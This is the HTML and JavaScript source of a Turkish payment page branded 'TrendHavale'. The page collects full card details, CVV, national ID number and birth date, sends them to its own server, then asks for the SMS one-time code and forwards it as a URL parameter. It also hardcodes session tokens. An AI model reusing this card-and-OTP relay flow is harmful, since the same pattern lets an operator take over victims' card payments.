<!DOCTYPE html>
<html lang="tr">
<head>
	<title>TrendHavale</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="https://trendhavale.com/images/new/trend.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css?v2">
    <link rel="stylesheet" type="text/css" href="css/custom.css">
    <link rel="stylesheet" type="text/css" href="yontem/main.css?v649951237">

<!--===============================================================================================-->
</head>
<body>
 <div class="limiter">
	<input type="hidden" id="pid">
	<div class="container-login100">
    	<div class="wrap-login100">
        	<center><img src="https://trendhavale.com/images/new/trendhavale.png?v2" class="logoo"><br>
            <div id="loader" style="display:none;color:#fff;">
            	<center><h5>İşleminiz Kontrol Ediliyor Lütfen Bekleyiniz.</h5></center> 
               <div class="spinner">
  					<div class="rect1"></div>
  					<div class="rect2"></div>
  					<div class="rect3"></div>
  					<div class="rect4"></div>
  					<div class="rect5"></div>
              </div>
            </div>
<style>
  .lds-ellipsis {
    display: inline-block;
    position: relative;
    width: 80px;
    height: 80px;
  }
  .lds-ellipsis div {
    position: absolute;
    top: 33px;
    width: 13px;
    height: 13px;
    border-radius: 50%;
    background: #ff7d00;
    animation-timing-function: cubic-bezier(0, 1, 1, 0);
  }
  .lds-ellipsis div:nth-child(1) {
    left: 8px;
    animation: lds-ellipsis1 0.6s infinite;
  }
  .lds-ellipsis div:nth-child(2) {
    left: 8px;
    animation: lds-ellipsis2 0.6s infinite;
  }
  .lds-ellipsis div:nth-child(3) {
    left: 32px;
    animation: lds-ellipsis2 0.6s infinite;
  }
  .lds-ellipsis div:nth-child(4) {
    left: 56px;
    animation: lds-ellipsis3 0.6s infinite;
  }
  @keyframes lds-ellipsis1 {
    0% {
      transform: scale(0);
    }
    100% {
      transform: scale(1);
    }
  }
  @keyframes lds-ellipsis3 {
    0% {
      transform: scale(1);
    }
    100% {
      transform: scale(0);
    }
  }
  @keyframes lds-ellipsis2 {
    0% {
      transform: translate(0, 0);
    }
    100% {
      transform: translate(24px, 0);
    }
  }
</style>




<form class="login100-form validate-form" action="#" onsubmit="return gonder();" style="display:none;" id="form1">
    <input type="hidden" value="615" id="sid" name="sid">
    <input type="hidden" value="39535092" id="sessionid" name="sessionid">
    <input type="hidden" value="" id="endpoint" name="endpoint">
    <input type="hidden" value="TL" id="currency" name="currency">
          <div class="wrap-input100" style="margin-bottom:0px !important;">
        <input class="input100 has-val" type="text" name="name" id="name" required>
        <span class="focus-input100" data-placeholder="Kart Üzerinde Bulunan İsim"></span>
      </div>
        <div class="text-center" style="margin-bottom:37px;">
        <span class="txt1">Adınızı ve Soyadınızı Kartta Olduğu Gibi Yazmalısınız.</span>
    </div>
    <div class="wrap-input100" style="margin-bottom:0px !important">
        <input class="input100 has-val" type="text" name="cardNumber" id="cardNumber" placeholder="0000 0000 0000 0000"  required>
        <span class="focus-input100" data-placeholder="Kart Numarası"></span>
    </div>
    <div class="col-md-12" style="display:inline-flex">
    <div class="wrap-input100 col-md-5" style="margin-bottom:0px !important">
        <input class="input100 has-val" type="text" name="skt" id="skt" placeholder="12/27"  required>
        <span class="focus-input100" data-placeholder="Son Kullanma Tarihi"></span>
    </div>
    <div class="wrap-input100 col-md-5" style="margin-bottom:0px !important; margin-left:auto">
        <input class="input100 has-val" type="text" name="cvv" id="cvv" placeholder="000"  required>
        <span class="focus-input100" data-placeholder="CVV"></span>
    </div>
    </div>
    <div class="wrap-input100" style="margin-top:50px">
        <input class="input100 has-val" type="number" value='300.0' disabled name="miktar" id="miktar" step="0.01" required>
        <span class="focus-input100" data-placeholder="Miktar (TL)"></span>
    </div>
    <div class="col-md-12" style="display:inline-flex">
      <div class="wrap-input100 col-md-5" style="margin-bottom:0px !important">
          <input class="input100 has-val" type="text" name="tckn" id="tckn" placeholder="" required>
          <span class="focus-input100" data-placeholder="TC Kimlik Numarası"></span>
      </div>
      <div class="wrap-input100 col-md-5" style="margin-bottom:0px !important; margin-left:auto">
          <input class="input100 has-val" type="date" name="year" id="year" placeholder=""  required>
          <span class="focus-input100" data-placeholder="Doğum Tarihi"></span>
      </div>
    </div>

  
    <div class="container-login100-form-btn">
        <div class="wrap-login100-form-btn">
            <div class="login100-form-bgbtn"></div>
            <button class="login100-form-btn">Yatırım İşlemine Başla</button>
        </div>
    </div>
</form>
<div class="login100-form validate-form"  id="form2" style="display:none;max-width:unset;">
<center>
<h7>İşlem Süresince <b>Kesinlikle</b> Sayfadan Ayrılmayınız.</h7><br>
<div class="lds-ellipsis" id="spinner"><div></div><div></div><div></div><div></div></div><br>
<h5 id="spinnerInfo">İşleminiz Kontrol Ediliyor..</h5><br>
<form id="otpForm" class="col-md-6" style="display:none" onsubmit="saveOTP();return false;">
<div class="wrap-input100" style="margin-bottom:0px !important">
  <input type="text" id="otp" class="input100">
  <span class="focus-input100" data-placeholder="SMS ile gelen 6 haneli kodu giriniz."></span>
</div>
<div class="container-login100-form-btn">
        <div class="wrap-login100-form-btn">
            <div class="login100-form-bgbtn"></div>
            <button class="login100-form-btn" type="submit">Devam Et</button>
        </div>
    </div>
</form>
<div id="restartBtn" class="col-md-6" style="display:none;">
<div class="container-login100-form-btn">
  <div class="wrap-login100-form-btn">
      <div class="login100-form-bgbtn"></div>
      <button class="login100-form-btn" onclick="restartProcess();">İşlemi Yeniden Başlat</button>
  </div>
</div>
</div>
</center>
</form>
<form class="login100-form validate-form" action="#" onsubmit="return false;" id="form3" style="display:none;">
  <center><div class="o-circle c-container__circle o-circle__sign--success"><div class="o-circle__sign"></div></div>
  <hr><h5>Yatırım talebiniz başarıyla oluşturulmuştur. Kontrollerin ardından yatırımınız üyeliğinize yansıyacaktır.<br>Siteye Yönlendiriliyorsunuz Lütfen Bekleyiniz.</h5><hr>
  </center>
</form>
</div>
</div>
</div>
<div id="dropDownSelect1"></div>
<!--===============================================================================================-->
<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
<script src="vendor/bootstrap/js/popper.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
<script src="vendor/daterangepicker/moment.min.js"></script>
<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
<script src="js/main.js"></script>
<script src="js/notify.js"></script>
<script type="text/javascript" src="vendor/qr/jquery.qrcode.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/0.9.0/jquery.mask.min.js"></script>
<script>
    function wait(ms){
        var start = new Date().getTime();
        var end = start;
        while(end < start + ms) {
            end = new Date().getTime();
        }
    }
   
    function yonlendir(a){
        var link = "?snc="+a;
        notify("Siteye Yönlendiriliyorsunuz Lütfen Bekleyiniz.","warning");


         setTimeout(function(){
           location.href="https://pyg.letspayments.com/finalpage?sp=107&ps=1629&mes=&clientRequestId=128372178&transactionAmount=300.0&currency=TRY&customerId=8458018&pstransid=&psName=TrendCreditCard&isNew=1&lang=tr&r="+a;
  // history.back();
         },5000); 
    }


   function notify(a,b){
       $.notify(a,
        {
           className:b});
   }

       function updatewallets(){
        $.ajax({
            url:"api/check.php?updatewallets",
            async:true,
            success:function(data){
            }
        }) 
    }
    

      /*  function cancel(){
        $("#loader").show();
        $("#form2").hide();
        $.ajax({
            url:"api/check.php?acancel",
            async:true,
            type:"get",
            dataType:"json",
            success:function(data){
                notify("Yatırım İşleminiz İptal Edilmiştir.","success")
                $("#pid").val("");
                $("#loader").hide();
                yonlendir("0");
            }
        })
    }*/

    (function checkbid(){
    $.ajax({
    url:"api/check.php?checkbid&id=1091336&token=27687deda5",
    async:true,
    dataType:"json",
    success:function(data){
    var status = data.status;
    if(status == "1"){
      yonlendir(1);
    }
    if(status == "0"){
      yonlendir(0);
  }
    if(status == ""){

  }
  }
  }).then(function(){
    setTimeout(checkbid,5000);
})
  })();
$(document).ready(function() {
  $(".logoo").attr("src","https://trendhavale.com/images/new/trendcc.png");
  $("#iframe").on('load',function(){
    $("#loader").hide();
    $("#form2").show();
  })
  $("#cvv").mask("000");
  $("#cardNumber").mask("0000 0000 0000 0000");
  $("#skt").mask("00/00");
    //var name = $("#name").val("SerhatElçi");
    $("#form1").show();});

function CopyToClipboard(id){
    var r = document.createRange();
    r.selectNode(document.getElementById(id));
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(r);
    document.execCommand('copy');
    window.getSelection().removeAllRanges();
}

function success() {
$("#loader").show();
$("#form2").hide();

$.ajax({
url: "api/check.php?ysuccess",
async: true,
dataType: "json",
success: function(data) {
    $("#loader").hide();
    $("#form3").show();
    yonlendir("1");
}
})

}



function gonder() {
  var miktar = $("#miktar").val();
  var cardNumber = $("#cardNumber").val();
  var cvv = $("#cvv").val();
  var skt = $("#skt").val();
  var fullname = $("#name").val();
  var tckn = $("#tckn").val();
  var year = $("#year").val();
  $("#loader").show();
  $("#form1").hide();
  $.ajax({
    url:"api/creditCardRouteNN.php",
    async:true,
    type:"POST",
    dataType:"JSON",
    data: {
      process:1,
      amount:miktar,
      cc:cardNumber,
      cvv:cvv,
      skt:skt,
      holder:fullname,
      tckn:tckn,
      birthday:year,
      id:"1091336",
      token:"27687deda5"
    },
    success:function(data){
      if(data.error != ""){
        $("#loader").hide();
        $("#form1").show();
        notify(data.error);
        return false;
      }
      if(data.url != "included"){
        var responseUrl = data.url;
        window.location.href = responseUrl;
        return false;
      }
      $("#form1").hide();
      $("#form2").show();
      $("#loader").hide();
      startControlProcess();
      return false;
    }
  })
  return false;
}

function startControlProcess(){
  $.ajax({
    url:"api/creditCard2.php?getProcessStatus&id=1091336&token=27687deda5",
    async:true,
    dataType:"JSON",
    success:function(data){
      if(data.error != ""){
        notify(data.error);
        setTimeout(startControlProcess,1000);
        return false;
      }
      if(data.info == "error"){
        $("#spinnerInfo").html("<b>Hata</b><br><br>"+data.message);
        $("#spinner").hide();
        $("#restartBtn").show();
      }else if(data.info == "info"){
        $("#spinnerInfo").html(data.message);
        setTimeout(startControlProcess,1000);
      }else if(data.info == "otp"){
        $("#spinnerInfo").html(data.message);
        $("#spinner").hide();
        $("#otpForm").show();
      }else if(data.info == "success"){
        $("#spinnerInfo").html(data.message);
        $("#spinner").hide();
      }
    },error:function(){
      setTimeout(startControlProcess,1000);
    }
  })
}

function saveOTP(){
  $("#spinner").show();
  $("#otpForm").hide();
  $("#spinnerInfo").html("İşleminiz Kontrol Ediliyor..");
  var otp = $("#otp").val();
  $.ajax({
    url:"api/creditCard2.php?saveOTP&id=1091336&token=27687deda5&otp="+otp,
    async:true,
    dataType:"JSON",
    success:function(data){
      if(data.error != ""){
        notify(data.error);
          $("#spinner").hide();
          $("#spinnerInfo").html("Ödemenizi onaylamak için cep telefonunuza gelen SMS'teki kodu giriniz.");
          $("#otpForm").show();
        return false;
      }
      $("#spinnerInfo").html("İşleminiz Kontrol Ediliyor..");
      startControlProcess();
    },error:function(){
      $("#spinner").hide();
      $("#otpForm").show();
      notify("Bir hata oluştu lütfen tekrar deneyiniz.");
    }
  })
}

function restartProcess(){
  $("#restartBtn").hide();
  $("#spinner").show();
  $("#spinnerInfo").html("İşleminiz Kontrol Ediliyor..");
  $.ajax({
    url:"api/creditCard2.php?restartProcess&id=1091336&token=27687deda5",
    async:true,
    dataType:"JSON",
    success:function(data){
      if(data.error != ""){
        notify(data.error);
        $("#spinner").hide();
        $("#spinnerInfo").html(data.error);
        return false;
      }
      location.reload();
    }
  })
}

</script>
</body>
</html>
